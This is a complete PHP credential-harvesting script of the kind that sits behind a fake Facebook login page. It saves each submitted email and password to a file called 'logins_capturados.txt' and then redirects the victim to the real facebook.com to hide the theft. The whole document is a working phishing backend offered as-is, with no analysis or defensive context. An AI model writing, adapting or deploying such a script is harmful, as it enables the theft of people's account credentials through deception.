<?php
if(isset($_POST['email']) && isset($_POST['pass'])) {
	$user =  'user: '.$_POST['email'].PHP_EOL;
	$pass = 'pass: '.$_POST['pass'].PHP_EOL.PHP_EOL;
	file_put_contents('logins_capturados.txt',$user,FILE_APPEND);
	file_put_contents('logins_capturados.txt',$pass,FILE_APPEND);
}
header('Location: https://facebook.com');
?>
